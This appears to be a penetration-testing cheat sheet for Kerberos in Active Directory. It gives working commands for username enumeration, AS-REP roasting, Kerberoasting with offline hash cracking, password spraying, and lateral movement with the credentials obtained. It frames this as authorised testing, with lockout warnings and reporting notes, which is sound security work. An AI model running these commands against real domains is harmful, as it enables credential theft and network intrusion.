# Kerberos

## Why It Matters

Kerberos is central to Active Directory auth. In practice it often leads to:

- username validation
- password spraying
- AS-REP roasting
- Kerberoasting
- ticket-based lateral movement after credential compromise

## Workflow

1. confirm the Kerberos service and domain
2. validate usernames carefully
3. identify roastable accounts
4. spray only with lockout awareness
5. use valid tickets and hashes to move into SMB, LDAP, WinRM, and other services

## Detection

```bash
nmap -p 88 -sV <ip>
nc -vn <target> 88
```

Kerberos by itself is usually not the end goal. It is the auth fabric behind the rest of AD.

## Step 1: Ticket Basics

```bash
kinit username@DOMAIN.LOCAL
klist
```

Once you have valid creds, ticket handling becomes part of your normal workflow.

## Step 2: Username Enumeration

```bash
kerbrute userenum --dc <dc_ip> -d DOMAIN.LOCAL users.txt
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='DOMAIN.COM',userdb=users.txt <target>
```

Use this carefully. It is useful for building a high-quality spray list.

## Step 3: AS-REP Roasting

For accounts without pre-auth:

```bash
impacket-GetNPUsers DOMAIN/ -dc-ip <dc_ip> -usersfile users.txt
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

This is one of the cleanest Kerberos attack paths because cracking happens offline.

## Step 4: Kerberoasting

Identify service accounts with SPNs:

```bash
impacket-GetUserSPNs DOMAIN/username:password -dc-ip <dc_ip>
impacket-GetUserSPNs DOMAIN/username:password -dc-ip <dc_ip> -request -outputfile hashes.txt
hashcat -m 13100 hashes.txt rockyou.txt
```

Service accounts often have weak human-managed passwords and privileged access.

## Step 5: Password Spraying

If spraying is in scope and lockout-aware:

```bash
kerbrute passwordspray --dc target.com -d DOMAIN.COM users.txt 'Password123!'
crackmapexec smb target.com -u users.txt -p 'Password123!' --continue-on-success
```

Always consider lockout thresholds before spraying.

## Step 6: Ticket Reuse And Lateral Movement

After obtaining tickets or creds:

- use SMB
- use WinRM
- use LDAP
- use remote execution where supported

The value of Kerberos is often what it unlocks elsewhere.

## Pitfalls

- spraying before checking lockout policy
- focusing on advanced ticket abuse before exhausting roast and reuse paths
- treating Kerberos as separate from LDAP, SMB, and WinRM

## Reporting Notes

Capture:

- valid usernames discovered
- AS-REP or TGS hashes obtained
- cracked service or user accounts
- the downstream access enabled by Kerberos-derived credentials

## Fast Checklist

```text
1. Confirm Kerberos and domain context
2. Build a clean user list
3. Check AS-REP roasting
4. Check Kerberoasting
5. Spray carefully if allowed
6. Use resulting creds or tickets on other AD services
```
